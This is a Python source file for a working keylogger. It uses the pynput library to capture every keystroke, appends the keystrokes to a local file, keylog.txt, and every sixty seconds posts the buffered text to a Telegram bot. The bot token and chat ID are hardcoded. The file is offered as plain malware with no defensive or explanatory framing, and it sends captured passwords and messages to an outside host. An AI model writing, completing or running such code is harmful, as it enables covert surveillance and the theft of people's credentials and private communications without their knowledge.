from pynput import keyboard
import requests
import threading
import time

# Telegram Bot credentials
BOT_TOKEN = "8490061327:AAHXRHKwjndqqYcHVX1D7N7g-X8Fcl2-a4g"
CHAT_ID = "7673624123"

log_file = "keylog.txt"
buffer = []
lock = threading.Lock()

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        requests.post(url, data=payload)
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

def periodic_send():
    while True:
        time.sleep(60)  # Send every 60 seconds
        with lock:
            if buffer:
                text = "".join(buffer)
                send_to_telegram(f"Keylog Update:\n{text}")
                buffer.clear()

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
        else:
            if key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.enter:
                char = "\n"
            elif key == keyboard.Key.backspace:
                char = "[BACKSPACE]"
            else:
                char = f"[{key.name.upper()}]"
        
        with lock:
            buffer.append(char)
        
        with open(log_file, "a") as f:
            f.write(char)

    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Start background thread for sending logs
threading.Thread(target=periodic_send, daemon=True).start()

# Start listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
